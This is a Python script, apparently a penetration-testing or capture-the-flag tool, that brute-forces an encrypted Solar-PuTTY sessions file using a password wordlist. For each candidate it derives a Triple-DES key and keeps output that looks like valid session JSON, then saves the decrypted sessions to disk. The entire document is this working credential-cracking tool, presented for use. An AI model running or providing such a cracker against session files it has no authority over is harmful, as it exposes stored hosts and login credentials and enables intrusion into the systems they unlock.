import base64
from Crypto.Cipher import DES3
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
import argparse
import sys

def decrypt(passphrase, ciphertext):
    try:
        encrypted_data = base64.b64decode(ciphertext)
        salt = encrypted_data[:24]
        iv = encrypted_data[24:32]
        encrypted_content = encrypted_data[32:]
        key = PBKDF2(passphrase.encode(), salt, dkLen=24, count=1000)
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted_content), DES3.block_size)
        return decrypted
    except Exception:
        return None

def is_likely_valid_decryption(decrypted_data):
    # Check if the decrypted data contains the string "Id"
    return b'"Id":' in decrypted_data

def main():
    parser = argparse.ArgumentParser(description="SolarPutty's Sessions Decrypter")
    parser.add_argument("session_file", help="Path to the session file")
    parser.add_argument("password_file", help="Path to the password file")
    args = parser.parse_args()

    print("-----------------------------------------------------")
    print("SolarPutty's Sessions Decrypter (Python Version)")
    print("-----------------------------------------------------")

    try:
        with open(args.session_file, 'rb') as file:
            ciphertext = file.read()

        print(f"File content (first 50 bytes): {ciphertext[:50]}")

        with open(args.password_file, 'r', errors='ignore') as pass_file:
            for password in pass_file:
                password = password.strip()
                print(f"Trying password: {password}", end='\r')
                sys.stdout.flush()

                decrypted_data = decrypt(password, ciphertext)

                if decrypted_data and is_likely_valid_decryption(decrypted_data):
                    print(f"\nPotential successful decryption with password: {password}")
                    print("Decrypted content (first 200 bytes):")
                    print(decrypted_data[:200])

                    output_file = f"SolarPutty_sessions_decrypted_{password}.bin"
                    with open(output_file, 'wb') as file:
                        file.write(decrypted_data)

                    print(f"\n[+] DONE Decrypted file is saved in: {output_file}")
                    
                    user_input = input("Continue trying other passwords? (y/n): ").lower()
                    if user_input != 'y':
                        return

        print("\nDecryption completed for all passwords.")

    except FileNotFoundError as e:
        print(f"Error: File not found - {e.filename}")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")

if __name__ == "__main__":
    main()
